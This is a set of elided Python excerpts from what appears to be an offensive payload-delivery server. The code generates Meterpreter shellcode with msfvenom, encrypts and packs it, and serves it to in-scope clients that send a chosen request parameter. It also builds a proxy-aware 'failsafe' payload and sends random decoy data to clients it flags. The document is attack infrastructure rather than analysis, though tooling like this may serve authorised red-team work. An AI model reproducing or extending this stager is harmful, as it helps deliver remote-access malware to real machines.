...
def process_request_payload(self):
    ...
    if (self.client_address[0] in scope_config) or ("ANY" in scope_config):
        try:
            ...
            # The server should process requests with a certain parameter
            # It does not matter what path the client requested, as long as it contains the parameter
            payload_ids = dict()
            payload_id = None
            ...
            if server_config["failsafe"].upper() in ["TRUE"] and self.headers.has_key("Content-MD5"):
                ...
                if unpacked_proxy:
                    libs.malout.print_error("HTTP proxy detected in target network...")
                    libs.malout.print_error("Meterpreter may have some trouble reaching your server...")
                    print ""
                    ...
                    for msfpayload in payload_config:
                        try:
                            if str(msfpayload["id"]).upper().find("FAILSAFE") > -1:
                                libs.malout.print_ok("Failsafe payload found!\n")
                                failsafe_package = ""
                                failsafe_default_file = default_failsafe
                                failsafe_cache_file = str(msfpayload["id"])
                                proxy_server_addr = unpacked_proxy.split(":")[0]
                                proxy_server_port = unpacked_proxy.split(":")[1]
                                libs.malout.print_info("Generating msf resource file for %s..." % msfpayload["payload"])
                                libs.malout.generate_failsafe_resource_file(server_config, metasploit_config, profile_response_config, profile_client_header_config, msfpayload, proxy_server_addr, proxy_server_port)
                                libs.malout.print_info("Generating %s with msfvenom...\n" % msfpayload["payload"])
                                failsafe_shellcode = libs.malpay.generate_failsafe_shellcode(metasploit_config, proxy_server_addr, proxy_server_port, msfpayload)
                                failsafe_package = libs.malpay.pack_data(failsafe_shellcode, cipher, profile_network_config, profile_response_config)
                                libs.malout.store_package_in_cache(metasploit_config["cachefolder"], failsafe_cache_file, failsafe_default_file, failsafe_package)
                                print ""
            ...
            if not failsafe_prepared:
                ...
                payload_ids["QUERYSTRING"] = libs.malnet.get_payload_id_from_path(self.path, profile_request_config["parameter"])
                payload_ids["COOKIE"] = libs.malnet.get_payload_id_from_cookie(cookie, profile_request_config["parameter"])
                payload_ids["BODY"] = libs.malnet.get_payload_id_from_body(post_body, profile_request_config["parameter"])
                ...
                if profile_request_config["location"].upper() in ["QUERYSTRING"]:
                    ...
                    if payload_ids["QUERYSTRING"]:
                        ...
                        libs.malout.print_ok("Payload ID \"%s\" found as expected..." % str(payload_id))
...
def process_request_get_caught(self):
    ...
    if (self.client_address[0] in scope_config) or ("ANY" in scope_config):
        try:
            ...
            package = libs.malpay.pack_data(generate_random_data(random.randint(1,1000)), cipher, profile_network_config, profile_response_config)
...
if __name__ == '__main__':
            ...
            while not payload_generated:
                ...
                try:
                    ...
                    if cache_file.upper().find("FAILSAFE") == -1:
                        ...
                        libs.malout.generate_resource_file(server_config, metasploit_config, profile_response_config, profile_client_header_config, msfpayload)
                        libs.malout.print_info("Generating %s with msfvenom...\n" % msfpayload["payload"])
                        shellcode = libs.malpay.generate_shellcode(metasploit_config, server_config, msfpayload)
                        package = libs.malpay.pack_data(shellcode, cipher, profile_network_config, profile_response_config)
                        libs.malout.store_package_in_cache(metasploit_config["cachefolder"], cache_file, default_file, package)
                    else:
                        if server_config["failsafe"].upper() in ["TRUE"]:
                            libs.malout.print_info("Failsafe payload detected %s...\n" % msfpayload["payload"])
                            libs.malout.print_info("Failsafe payload is enabled. Continuing...\n")
                            time.sleep(3)
    ...
    try:
        ...
        if server_config["failsafe"].upper() in ["TRUE"]:
            libs.malout.print_info("Failsafe payload enabled...")
        ...
        libs.malout.print_error("A valid port must be provided in server config.\n")
        pass
